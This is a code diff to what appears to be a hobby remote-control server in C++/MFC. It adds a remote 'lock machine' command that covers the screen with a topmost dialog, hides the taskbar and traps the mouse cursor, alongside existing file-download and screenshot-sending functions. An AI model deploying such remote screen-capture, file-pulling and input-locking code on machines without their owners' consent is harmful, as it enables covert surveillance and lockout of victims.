@@ -9,6 +9,7 @@
 #include <io.h>
 #include <list>
 #include <atlimage.h>
+#include "LockInfoDialog.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -24,11 +25,11 @@ void dump(BYTE* pData, size_t nSize) {//?
 	for (size_t i = 0; i < nSize; i++)
 	{
 		char buf[16] = "";
-		if (i>0&&(i%16==0))
+		if (i > 0 && (i % 16 == 0))
 		{
 			strOut += "\n";
 		}
-		snprintf(buf, sizeof(buf), "%02X ", pData[i]&0xFF );
+		snprintf(buf, sizeof(buf), "%02X ", pData[i] & 0xFF);
 		strOut += buf;
 	}
 	strOut += "\n";
@@ -66,12 +67,12 @@ typedef struct file_info {
 	BOOL isDirectory;//是否为目录 1是
 	BOOL hasNext;//是否有后续  1有
 	char szFileName[256];//文件名
-}FILEINFO,*PFILEINFO;
+}FILEINFO, * PFILEINFO;
 
 int makeDirectoryInfo() {
 	std::string strPath;
 	//std::list<FILEINFO> lstFileInfos;
-	if (gpServer->getFilePath(strPath)==false)
+	if (gpServer->getFilePath(strPath) == false)
 	{
 		OutputDebugString(_T("当前的命令，不是获取文件列表，命令错误!"));
 		return -1;
@@ -91,7 +92,7 @@ int makeDirectoryInfo() {
 	}
 	_finddata_t fdata;
 	int hFind = 0;
-	if ((hFind=_findfirst("*",&fdata))==-1)
+	if ((hFind = _findfirst("*", &fdata)) == -1)
 	{
 		OutputDebugString(_T("没有找到任何文件!"));
 		return -3;
@@ -104,7 +105,7 @@ int makeDirectoryInfo() {
 		//lstFileInfos.push_back(finfo);
 		CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
 		gpServer->sendCom(pack);
-	} while (!_findnext(hFind,&fdata));
+	} while (!_findnext(hFind, &fdata));
 	//发送信息到控制端
 	FILEINFO finfo;
 	finfo.hasNext = FALSE;
@@ -127,7 +128,7 @@ int downLoadFile() {
 	gpServer->getFilePath(strPath);
 	long long data = 0;
 	FILE* pFile = fopen(strPath.c_str(), "rb");
-	if (pFile==NULL)
+	if (pFile == NULL)
 	{
 		CPacket pack(4, (BYTE*)&data, 8);
 		gpServer->sendCom(pack);
@@ -144,7 +145,7 @@ int downLoadFile() {
 		rlen = fread(buffer, 1, 1024, pFile);
 		CPacket pack(4, (BYTE*)buffer, rlen);//读1K发1K
 		gpServer->sendCom(pack);
-	} while (rlen>=1024);
+	} while (rlen >= 1024);
 	CPacket pack(4, NULL, 0);//到头了，发送终止符
 	gpServer->sendCom(pack);
 	fclose(pFile);
@@ -259,7 +260,7 @@ int sendScreen() {
 	if (hMen == NULL)return -1;
 	IStream* pStream = NULL;
 	HRESULT ret = CreateStreamOnHGlobal(hMen, TRUE, &pStream);
-	if (ret==S_OK)
+	if (ret == S_OK)
 	{
 		screen.Save(_T("test2023"), Gdiplus::ImageFormatPNG);//保存为png格式图片文件,仅保存到文件夹，需要保存到内存
 		LARGE_INTEGER bg{ 0 };
@@ -272,6 +273,72 @@ int sendScreen() {
 	pStream->Release();
 	GlobalFree(hMen);//<=>GlobalAlloc
 	screen.ReleaseDC();//释放DC<=>Creat
+	return 0;
+}
+
+CLockInfoDialog dlg;
+unsigned threadid = 0;
+
+unsigned __stdcall threadLockDlg(void*arg) {
+	TRACE("%s(%d):%d\r\n", __FUNCTION__, __LINE__, GetCurrentThreadId());
+	dlg.Create(IDD_DIALOG_INFO, NULL);
+	dlg.ShowWindow(SW_SHOW);
+	//遮蔽后台窗口
+	CRect rect;
+	rect.left = 0;
+	rect.top = 0;
+	rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
+	rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
+	rect.bottom *= 1.1;
+	//该函数改变指定窗口的位置和尺寸。对于顶层窗口，位置和尺寸是相对于屏幕的左上角的：对于子窗口，位置和尺寸是相对于父窗口客户区的左上角坐标的
+	dlg.MoveWindow(rect);
+	dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);//窗口置顶
+	//ShowCursor(false);//隐藏鼠标
+	::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);//隐藏windows任务栏
+	//GetWindowRect得到的是整个窗口相对于窗口左上角的坐标，实际上就是这个对话框的大小
+	//dlg.GetWindowRect(rect);
+	/*该函数把鼠标限制在屏幕上的一个矩形区域内，如果调用SetCursor或用鼠标设置的一个随后的鼠标位置在该矩形区域的外面，
+	则系统自动调整该位置以保持鼠标在矩形区域之内。*/
+	rect.left = 0;
+	rect.top = 0;
+	rect.right = 1;
+	rect.bottom = 1;
+	ClipCursor(rect);
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0)) {//死循环，放在子线程里
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+		if (msg.message == WM_KEYDOWN) {
+			TRACE("msg:%08x wparam:%08x lparam:%08x\r\n", msg.message, msg.wParam, msg.lParam);
+			if (msg.wParam == 0x1B) {
+				break;
+			}
+		}
+	}
+	ShowCursor(true);
+	::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);//显示windows任务栏
+	dlg.DestroyWindow();
+	_endthreadex(0);
+	return 0;
+}
+int LockMachine() {
+	//防止多次调用LockMachine
+	if ((dlg.m_hWnd == NULL) || (dlg.m_hWnd == INVALID_HANDLE_VALUE)) {
+		_beginthreadex(NULL,0,threadLockDlg,NULL,0,&threadid );
+		TRACE("threadId=%d\r\n", threadid);
+	}
+	CPacket pack(7, NULL, 0);
+	gpServer->sendCom(pack);
+	return 0;
+}
+
+int UnLockMachine() {
+	//dlg.SendMessage(WM_KEYDOWN, 0x1B, 0x00010001);//对话框
+	//::SendMessage(dlg.m_hWnd, WM_KEYDOWN, 0x1B, 0x00010001);//窗口句柄
+	//MFC消息机制是基于线程的（CWinThread类），没有绑定线程发消息没用，必须往线程里发消息
+	PostThreadMessage(threadid, WM_KEYDOWN, 0x1B, 0);
+	CPacket pack(7, NULL, 0);
+	gpServer->sendCom(pack);
 	return 0;
 }
 
@@ -310,7 +377,8 @@ int main()
 				int ret = gpServer->dealCommand();
 				TODO:处理命令
 			}*/
-			int nCmd = 1;
+			int nCmd = 7;
+
 			switch (nCmd)
 			{
 			case 1://查看磁盘分区
@@ -330,8 +398,21 @@ int main()
 				break;
 			case 6://发送屏幕的内容=>发送屏幕截图
 				sendScreen();
+				break;
+			case 7://锁机
+				LockMachine();
+				break;
+			case 8://解锁
+				UnLockMachine();
+				break;
 			default:
 				break;
+			}
+			Sleep(5000);
+			UnLockMachine();
+			TRACE("m_hWnd = %08X\r\n", dlg.m_hWnd);
+			while (dlg.m_hWnd != NULL) {
+				Sleep(10);
 			}
 		}
 	}
